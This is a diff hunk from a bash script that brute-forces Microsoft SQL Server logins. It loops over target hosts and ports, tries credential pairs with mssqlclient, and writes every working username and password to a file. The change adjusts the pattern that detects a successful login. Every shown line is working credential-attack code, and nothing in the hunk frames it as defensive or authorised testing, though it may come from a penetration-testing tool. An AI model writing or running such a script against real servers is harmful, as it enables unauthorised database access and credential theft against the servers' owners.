@@ -55,7 +55,7 @@ while IFS=: read -r TARGET_IP TARGET_PORT; do
             RESULT=$(printf 'exit\n' | \
                 mssqlclient "${USER}:${PASS}@${TARGET_IP}" -port "$TARGET_PORT" 2>&1)
 
-            if echo "$RESULT" | grep -qi "SQL\|Impacket\|Press help"; then
+            if echo "$RESULT" | grep -qi "ENVCHANGE\|ACK:\|Press help"; then
                 echo "[+] Found credentials: $USER:$PASS on $TARGET_IP:$TARGET_PORT"
                 echo "$TARGET_IP:$TARGET_PORT:$USER:$PASS" >> "$CREDS_OUT"
                 FOUND=1
